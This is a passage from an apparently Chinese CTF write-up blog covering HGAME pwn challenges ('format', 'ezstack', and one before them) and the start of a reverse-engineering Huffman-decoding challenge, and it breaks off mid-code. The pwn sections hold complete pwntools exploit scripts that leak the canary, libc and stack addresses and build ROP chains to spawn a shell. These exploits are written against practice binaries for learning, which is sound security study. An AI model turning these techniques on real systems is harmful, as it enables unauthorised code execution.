src="/post/8f4f1881/1739293696037-8c91433a-7b82-4173-9ae6-9586b87b186c.png" class="" title="img"><p>之后程序再次循环，此时我们将 v8 的值再修改成一个合适的值，然后逐个写入 gadget 即可构造 rop 链进行gets hell。这里我将 v8 修改成 22，然后从 canary 开始填充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">p.recvuntil(<span class="hljs-string">&quot;How many flowers have you prepared this time?&quot;</span>)<br>p.sendline(str(<span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">15</span>)</span>:<br>    p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot;the flower number &#123;&#125; : &quot;</span>.format(i+<span class="hljs-number">1</span>))</span><br>    p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(<span class="hljs-number">1</span>))</span><br><br>p.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(<span class="hljs-string">&quot; : &quot;</span>)</span><br>p.<span class="hljs-title function_">sendline</span><span class="hljs-params">(str(u64(p64(<span class="hljs-number">0x1000000016</span>))))</span><br><br>#17--&gt;canary 18--&gt;rbp 19--&gt;rdi 20--&gt;binsh 21--&gt;ret 22--&gt;system<br>payload = [<br>    str(u64(p64(canary))),  # <span class="hljs-number">17</span><br>    str(<span class="hljs-number">111</span>),               # <span class="hljs-number">18</span><br>    str(u64(p64(pop_rdi))), # <span class="hljs-number">19</span><br>    str(u64(p64(binsh))),   # <span class="hljs-number">20</span><br>    str(u64(p64(ret))),     # <span class="hljs-number">21</span><br>    str(u64(p64(system)))   # <span class="hljs-number">22</span><br>]<br><br><span class="hljs-keyword">for</span> data in payload:<br>    p.recvuntil(<span class="hljs-string">&quot; : &quot;</span>)<br>    p.sendline(data)<br><br>p.recvuntil(<span class="hljs-string">&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;</span>)<br>p.sendline(str(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node1.hgame.vidar.club&#x27;, 30345)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-comment"># attach(p, &#x27;b *$rebase(0x13E5)&#x27;)</span><br>    attach(p, <span class="hljs-string">&#x27;b *$rebase(0x140F)&#x27;</span>)<br>    <span class="hljs-comment"># attach(p, &#x27;b *$rebase(0x147F)&#x27;)</span><br>    pause()<br><br><span class="hljs-comment"># debug()</span><br>p.recvuntil(<span class="hljs-string">&quot;How many flowers have you prepared this time?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;the flower number &#123;&#125; : &quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot; : &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(u64(p64(<span class="hljs-number">0x1300000013</span>))))<br>p.recvuntil(<span class="hljs-string">&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;Let&#x27;s look at the results.&quot;</span>)<br>data_list = p.recvuntil(<span class="hljs-string">&#x27;=&#x27;</span>)<br>data_list = data_list.split(<span class="hljs-string">b&#x27; + &#x27;</span>)<br>canary = <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">int</span>(data_list[<span class="hljs-number">16</span>]))<br>success(<span class="hljs-string">&#x27;canary:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br>libc_base = <span class="hljs-built_in">int</span>(data_list[<span class="hljs-number">18</span>]) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = libc_base + <span class="hljs-number">0x29139</span><br><br>p.recvuntil(<span class="hljs-string">&quot;How many flowers have you prepared this time?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;the flower number &#123;&#125; : &quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot; : &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(u64(p64(<span class="hljs-number">0x100000016</span>))))<br><br><span class="hljs-comment">#17--&gt;canary 18--&gt;rbp 19--&gt;rdi 20--&gt;binsh 21--&gt;ret 22--&gt;system</span><br>payload = [<br>    <span class="hljs-built_in">str</span>(u64(p64(canary))),  <span class="hljs-comment"># 17</span><br>    <span class="hljs-built_in">str</span>(<span class="hljs-number">111</span>),               <span class="hljs-comment"># 18</span><br>    <span class="hljs-built_in">str</span>(u64(p64(pop_rdi))), <span class="hljs-comment"># 19</span><br>    <span class="hljs-built_in">str</span>(u64(p64(binsh))),   <span class="hljs-comment"># 20</span><br>    <span class="hljs-built_in">str</span>(u64(p64(ret))),     <span class="hljs-comment"># 21</span><br>    <span class="hljs-built_in">str</span>(u64(p64(system)))   <span class="hljs-comment"># 22</span><br>]<br><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> payload:<br>    p.recvuntil(<span class="hljs-string">&quot; : &quot;</span>)<br>    p.sendline(data)<br><br>p.recvuntil(<span class="hljs-string">&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p>main 函数存在格式化字符串漏洞，次数可以自定义，但是字符数限制在 3 字符以内；之后调用了 vuln 函数，vuln 函数中 size 是自定义，但是 size 在小于等于 5 时才可以调用 vuln 函数，vuln 函数的 buf 大小是 4；我们还可以发现 vuln 函数中 size 是 unsigned int 类型，因此可以造成整数溢出。</p><img src="/post/8f4f1881/1738847543147-176e1343-8929-497f-8f35-377a7ea77834.png" class="" title="img"><img src="/post/8f4f1881/1738847567450-16ea8338-f800-4c00-8e0f-d2e7a3945515.png" class="" title="img"><p>经过反复模糊测试，发现只能输入%p 时来泄露出栈地址（这里预期是直接泄露出地址，但是我不会</p><p>&#x2F;(ㄒoㄒ)&#x2F;~~），同时 size 输入正整数之后还要输入一个字符。</p><p>那么我们先使用一次格式化字符串漏洞来泄露出栈地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;you have n chance to getshell\n n = &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;type something:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;you type: &#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;stack:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(stack)))<br></code></pre></td></tr></table></figure><img src="/post/8f4f1881/1738849907903-136e746b-a4d7-458e-9051-375b4ec680eb.png" class="" title="img"><p>接下来我们输入-1 来进行栈溢出，输入-1 之后还需要输入一个字符。此时我们有足够的空间来构造 payload，但是我们发现并没有 rdi 的 gadget，因此常规的泄露 libc 方法行不通了。</p><p>通过仔细查看汇编代码，我们发现有如下部分，这部分就是格式化字符串漏洞 printf(format)；可以看到 <code>lea rax, [rbp-0x10]</code>这条汇编语句，意思是在 rbp-0x10 的位置取出数值赋值给 rax，那么我们可以在栈溢出之后返回到这个位置，同时构造出适当的 rbp 并且让 printf 的参数为%n$p 形式，这样在返回到 printf 处就会泄露出 libc</p><img src="/post/8f4f1881/1738850489970-82776c76-b48f-4ef4-8452-6db8dbd7a40b.png" class="" title="img"><p>gdb 调试，可以看到在返回地址的下方，即 rbp+0x10 的位置，我们可以放参数%9$p；我们要将这个位置在返回之后变成 rbp-0x10，那么返回后的 rbp 就必须是当前 rbp+0x20 位置的地址，我们可以计算出泄露出的栈地址到这个地址的距离，计算出距离是 0x2130</p><img src="/post/8f4f1881/1739710027031-3d0350ea-4181-452f-a6a8-822c33523c76.png" class="" title="img"><p>我们将 rbp 修改，ret 覆盖为汇编<code>lea rax, [rbp-0x10]</code>的地址，然后在栈上写入%9$p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">&quot;you have n space to getshell(n&lt;5)\n n = &quot;</span>)<br>payload = <span class="hljs-string">b&#x27;-1\n\x00&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;type something:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span> + p64(stack+<span class="hljs-number">0x2130</span>) + p64(<span class="hljs-number">0x4012CF</span>) + <span class="hljs-string">b&#x27;%9$p&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p.sendline(payload)<br></code></pre></td></tr></table></figure><p>可以看到，此时返回的 rbp 已经变成了当前 rbp+0x20 的地址（这里可能会失败，需要多试几次）</p><img src="/post/8f4f1881/1739710565750-d7b3d283-55e0-4d71-b659-5f49fc984a24.png" class="" title="img"><p>当返回到<code>lea rax, [rbp-0x10]</code>时，rbp-0x10位置是%9$p，那么经过取值再赋值之后 printf 的参数就是%9$p，这样就可以泄露出 libc 地址</p><img src="/post/8f4f1881/1739710666218-cd4197bb-a3c0-433d-b720-a5c25cc48fb6.png" class="" title="img"><img src="/post/8f4f1881/1739710703093-c48f3381-61c3-4c88-a30e-d49b72a9c922.png" class="" title="img"><p>此时我们还需要注意的是，由于我们使用的是 sendline 发送，rbp-8 位置的末尾被覆盖成了 a，而 rbp-8 的位置就是第一个循环次数 n ，因此 n 就覆盖成了 10。这个值也可以改成其他的数值，比如我们可以用 <code>b&#39;\x03&#39;</code>将 n 改成 3，这样就可以只循环 2 两次</p><img src="/post/8f4f1881/1739710816578-d0006bc8-0704-4395-9999-afaa5272427c.png" class="" title="img"><p>泄露出 libc 地址之后，我们再次输入-1，就可以进行栈溢出构造 rop 来 getshell 了</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node1.hgame.vidar.club&#x27;, 30901)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br><span class="hljs-comment"># attach(p, &#x27;b *0x4011B6&#x27;)#vuln</span><br>attach(p, <span class="hljs-string">&#x27;b *0x4011E8&#x27;</span>)<span class="hljs-comment">#read</span><br>pause()<br><br><span class="hljs-comment"># debug()</span><br>p.recvuntil(<span class="hljs-string">&quot;you have n chance to getshell\n n = &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;type something:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;you type: &#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;stack:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(stack)))<br><br>p.recvuntil(<span class="hljs-string">&quot;you have n space to getshell(n&lt;5)\n n = &quot;</span>)<br>payload = <span class="hljs-string">b&#x27;-1\n\x00&#x27;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;type something:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + p64(stack+<span class="hljs-number">0x2130</span>) + p64(<span class="hljs-number">0x4012CF</span>) + <span class="hljs-string">b&#x27;%9$p&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x03&#x27;</span><br>p.send(payload)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x29d90</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>p.recvuntil(<span class="hljs-string">&quot;type something:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;you have n space to getshell(n&lt;5)\n n = &quot;</span>)<br>payload = <span class="hljs-string">b&#x27;-1\n\x00&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;type something:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h3><p>这道题做法挺常规的，但是不知道为什么在rbp写bss段的时候写不进去。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Compress-dot-new"><a href="#Compress-dot-new" class="headerlink" title="Compress dot new"></a>Compress dot new</h3><p>ida 查看</p><img src="/post/8f4f1881/1739003719555-c5d1cad5-b622-46e8-b825-1e2104f1237d.png" class="" title="img"><p>enc.txt 内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:125&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:119&#125;,&quot;b&quot;:&#123;&quot;s&quot;:123&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:104&#125;,&quot;b&quot;:&#123;&quot;s&quot;:105&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:101&#125;,&quot;b&quot;:&#123;&quot;s&quot;:103&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:10&#125;,&quot;b&quot;:&#123;&quot;s&quot;:13&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:32&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:115&#125;,&quot;b&quot;:&#123;&quot;s&quot;:116&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:46&#125;,&quot;b&quot;:&#123;&quot;s&quot;:48&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:76&#125;,&quot;b&quot;:&#123;&quot;s&quot;:78&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:83&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:68&#125;,&quot;b&quot;:&#123;&quot;s&quot;:69&#125;&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:44&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:33&#125;,&quot;b&quot;:&#123;&quot;s&quot;:38&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:45&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:100&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:98&#125;,&quot;b&quot;:&#123;&quot;s&quot;:99&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:49&#125;,&quot;b&quot;:&#123;&quot;s&quot;:51&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:97&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:117&#125;,&quot;b&quot;:&#123;&quot;s&quot;:118&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:112&#125;,&quot;b&quot;:&#123;&quot;s&quot;:113&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:114&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:108&#125;,&quot;b&quot;:&#123;&quot;s&quot;:109&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:110&#125;,&quot;b&quot;:&#123;&quot;s&quot;:111&#125;&#125;&#125;&#125;&#125;&#125;<brbr></code></pre></td></tr></table></figure><p>直接丢给deepseek</p><p>由于代码逻辑较为复杂，手动还原 <code>flag</code> 可能会比较困难。以下是一个大致的思路：</p><ol><li><strong>解析 JSON</strong>：将 <code>enc.txt</code> 中的 JSON 结构解析为 Python 字典。</li><li><strong>构建 Huffman 树</strong>：根据字典中的 <code>s</code> 和 <code>w</code> 键值对，构建 Huffman 树。</li><li><strong>生成解码表</strong>：遍历 Huffman 树，生成每个字符对应的二进制编码。</li><li><strong>解码二进制字符串</strong>：根据生成的解码表，将二进制字符串解码为原始字符。</li></ol><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict, deque<br><br><span class="hljs-comment">#字典</span><br>data = &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">125</span>&#125;,<br>                    <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">119</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">123</span>&#125;&#125;<br>                &#125;,<br>                <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">104</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">105</span>&#125;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">101</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">103</span>&#125;&#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">10</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">13</span>&#125;&#125;,<br>                <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">32</span>&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">115</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">116</span>&#125;&#125;<br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;a&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">46</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">48</span>&#125;&#125;,<br>                    <span class="hljs-string">&quot;b&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;a&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span class="hljs-number">76</span>&#125;, <span class="hljs-string">&quot;b&quot;</span>: &#123;<span class="hljs-string">&quot;s&quot;</span>: <span 